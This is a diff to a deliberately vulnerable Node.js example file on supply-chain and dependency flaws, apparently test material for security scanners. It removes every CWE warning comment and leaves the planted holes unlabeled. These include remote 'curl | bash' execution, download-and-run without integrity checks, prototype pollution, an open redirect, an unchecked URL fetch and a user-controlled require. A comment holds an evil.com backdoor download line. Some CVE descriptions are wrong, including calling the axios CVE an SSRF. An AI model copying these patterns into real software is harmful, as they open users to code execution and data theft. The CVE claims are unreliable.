@@ -1,12 +1,12 @@
 /**
  * dependency.js — Supply chain & dependency vulnerability examples (Node.js)
  *
- * VULNERABILITIES:
- *   - CWE-1104: Use of unmaintained third-party components
- *   - CWE-937: Using components with known vulnerabilities (OWASP A06)
- *   - CWE-494: Download of code without integrity check
- *   - CWE-829: Inclusion of functionality from untrusted source
- *   - CWE-427: Uncontrolled search path element
+
+
+
+
+
+
  */
 
 const https = require('https');
@@ -14,11 +14,11 @@ const { execSync } = require('child_process');
 const fs = require('fs');
 
 // ═══════════════════════════════════════════
-// VULNERABILITY [CWE-494]: Untrusted Code Download
+
 // ═══════════════════════════════════════════
 
 function badDownloadAndRun(url) {
-    // VULNERABILITY [CWE-494]: Download and execute code without integrity check
+
     https.get(url, (res) => {
         let script = '';
         res.on('data', chunk => script += chunk);
@@ -30,7 +30,7 @@ function badDownloadAndRun(url) {
 }
 
 function badInstallScript() {
-    // VULNERABILITY [CWE-494]: postinstall script runs arbitrary commands
+
     // This would be in package.json:
     // "scripts": { "postinstall": "curl http://evil.com/backdoor.sh | bash" }
     execSync('curl https://some-cdn.com/setup.sh | bash');
@@ -38,7 +38,7 @@ function badInstallScript() {
 }
 
 // ═══════════════════════════════════════════
-// VULNERABILITY [CWE-937]: Known Vulnerable Dependencies
+
 // ═══════════════════════════════════════════
 
 // This file demonstrates what happens when you use vulnerable versions:
@@ -46,32 +46,32 @@ function badInstallScript() {
 // Example: lodash < 4.17.21 — prototype pollution (CVE-2020-8203)
 function badLodashUsage(data) {
     const _ = require('lodash');
-    // VULNERABILITY [CWE-937]: lodash < 4.17.21 has prototype pollution in _.set
+
     _.set({}, data.path, data.value);  // Prototype pollution via __proto__ path
 }
 
 // Example: express < 4.17.0 — open redirect (CVE-2024-29041)
 function badExpressRedirect(req, res) {
-    // VULNERABILITY [CWE-937]: express < 4.17.0 has open redirect vulnerability
+
     res.redirect(req.query.url);  // No validation!
 }
 
 // Example: marked < 4.0.0 — ReDoS (CVE-2022-21680)
 function badMarkedRender(userInput) {
     const marked = require('marked');
-    // VULNERABILITY [CWE-937]: marked < 4.0.0 has multiple ReDoS vectors
+
     return marked.parse(userInput);
 }
 
 // Example: axios < 1.6.0 — SSRF (CVE-2023-45857)
 function badAxiosRequest(userURL) {
     const axios = require('axios');
-    // VULNERABILITY [CWE-937]: axios < 1.6.0 SSRF via absolute URL bypass
+
     return axios.get(userURL);
 }
 
 // ═══════════════════════════════════════════
-// VULNERABILITY [CWE-1104]: Abandoned Dependencies
+
 // ═══════════════════════════════════════════
 
 // Conceptual: using packages that are no longer maintained
@@ -84,29 +84,29 @@ const VULNERABLE_DEPENDENCIES = [
 ];
 
 // ═══════════════════════════════════════════
-// VULNERABILITY [CWE-427]: Unsafe PATH / Module Resolution
+
 // ═══════════════════════════════════════════
 
 function badNpmInstallUntrusted() {
-    // VULNERABILITY [CWE-427]: npm install without --ignore-scripts
+
     // Running: npm install some-package (postinstall scripts run automatically)
     execSync('npm install untrusted-package');
     // postinstall scripts in untrusted packages = arbitrary code execution
 }
 
 function badRequireDynamicPath(userPath) {
-    // VULNERABILITY [CWE-427]: require with user-controlled path
+
     const resolved = require.resolve(userPath);
     return require(resolved);
     // Attacker: userPath = '../../malicious-module' → loads attacker-controlled code
 }
 
 // ═══════════════════════════════════════════
-// VULNERABILITY [CWE-829]: Untrusted CDN/Module Source
+
 // ═══════════════════════════════════════════
 
 function badImportFromCDN() {
-    // VULNERABILITY [CWE-829]: Importing modules from untrusted CDN
+
     // <script src="https://untrusted-cdn.example.com/library.js">
     // No SRI (Subresource Integrity) hash — CDN compromise = XSS
     const html = `
